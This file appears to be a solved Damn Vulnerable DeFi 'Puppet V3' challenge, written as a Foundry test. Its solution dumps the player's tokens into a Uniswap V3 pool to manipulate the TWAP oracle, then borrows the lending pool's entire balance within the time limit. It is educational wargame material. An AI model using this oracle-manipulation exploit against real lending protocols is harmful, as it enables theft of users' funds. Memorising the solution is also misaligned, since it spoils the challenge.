// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "@uniswap/v3-periphery/contracts/libraries/LiquidityAmounts.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";

import {FlashSwapper} from "./FlashSwapper.sol";

contract PuppetV3Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint24 constant FEE = 3000;

    IUniswapV3Factory uniswapFactory =
        IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    INonfungiblePositionManager positionManager =
        INonfungiblePositionManager(
            payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88)
        );

    address constant UNISWAP_V3_ROUTER =
        0xE592427A0AEce92De3Edee1F18E0157C05861564;

    ISwapRouter swapRouter = ISwapRouter(UNISWAP_V3_ROUTER);
    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    DamnValuableToken token;
    PuppetV3Pool lendingPool;

    uint256 initialBlockTimestamp;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

        startHoax(deployer);

        // Set player's initial balance
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deployer wraps ETH in WETH
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        token = new DamnValuableToken();

        // Create Uniswap v3 pool
        bool isWethFirst = address(weth) < address(token);
        address token0 = isWethFirst ? address(weth) : address(token);
        address token1 = isWethFirst ? address(token) : address(weth);
        positionManager.createAndInitializePoolIfNecessary({
            token0: token0,
            token1: token1,
            fee: FEE,
            sqrtPriceX96: _encodePriceSqrt(1, 1)
        });

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(
            uniswapFactory.getPool(address(weth), address(token), FEE)
        );
        // This set how many price observations the pool will store
        uniswapPool.increaseObservationCardinalityNext(40);

        // Deployer adds liquidity at current price to Uniswap V3 exchange
        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                tickLower: -60,
                tickUpper: 60,
                fee: FEE,
                recipient: deployer,
                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
                amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        // Deploy the lending pool
        lendingPool = new PuppetV3Pool(weth, token, uniswapPool);

        // Setup initial token balances of lending pool and player
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(
            address(lendingPool),
            LENDING_POOL_INITIAL_TOKEN_BALANCE
        );

        // Some time passes
        skip(3 days);

        initialBlockTimestamp = block.timestamp;

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertGt(initialBlockTimestamp, 0);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(
            token.balanceOf(address(lendingPool)),
            LENDING_POOL_INITIAL_TOKEN_BALANCE
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV3() public checkSolvedByPlayer {
        IUniswapV3Pool uniswapPool = IUniswapV3Pool(
            uniswapFactory.getPool(address(weth), address(token), FEE)
        );
        uint256 initialWethBalance = weth.balanceOf(address(this));
        (, , , uint16 observationCardinality, , , ) = uniswapPool.slot0();
        console.log("observationCardinality: ", observationCardinality);
        swapDVTForWETH(110e18); // Swap all DVT for WETH
        (, , , uint16 observationCardinality1, , , ) = uniswapPool.slot0();
        console.log("observationCardinality1: ", observationCardinality1);
        console.log("Required deposit1", lendingPool.calculateDepositOfWETHRequired(1_000_000e18));
        // vm.roll(block.number + 1); // Move to next block
        vm.warp(block.timestamp + 114 seconds);
        (, , , uint16 observationCardinality2, , , ) = uniswapPool.slot0();
        console.log("Required deposit2", lendingPool.calculateDepositOfWETHRequired(1_000_000e18));
        console.log("observationCardinality2: ", observationCardinality2);
        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(1_000_000e18);

        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    function swapDVTForWETH(
        uint256 dvtAmount
    ) public returns (uint256 wethAmountOut) {
        // Approve the router to spend DVT
        TransferHelper.safeApprove(
            address(token),
            address(swapRouter),
            dvtAmount
        );

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: address(token),
                tokenOut: address(weth),
                fee: FEE, // 0.3% fee tier
                recipient: player,
                deadline: block.timestamp,
                amountIn: dvtAmount,
                amountOutMinimum: 0, // Be careful with this in production!
                sqrtPriceLimitX96: 0
            });

        // Execute the swap
        wethAmountOut = swapRouter.exactInputSingle(params);

        // For safety, reset the allowance to 0
        TransferHelper.safeApprove(address(token), address(swapRouter), 0);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertLt(
            block.timestamp - initialBlockTimestamp,
            115,
            "Too much time passed"
        );
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Lending pool still has tokens"
        );
        assertEq(
            token.balanceOf(recovery),
            LENDING_POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }

    function _encodePriceSqrt(
        uint256 reserve1,
        uint256 reserve0
    ) private pure returns (uint160) {
        return
            uint160(
                FixedPointMathLib.sqrt(
                    (reserve1 * 2 ** 96 * 2 ** 96) / reserve0
                )
            );
    }
}
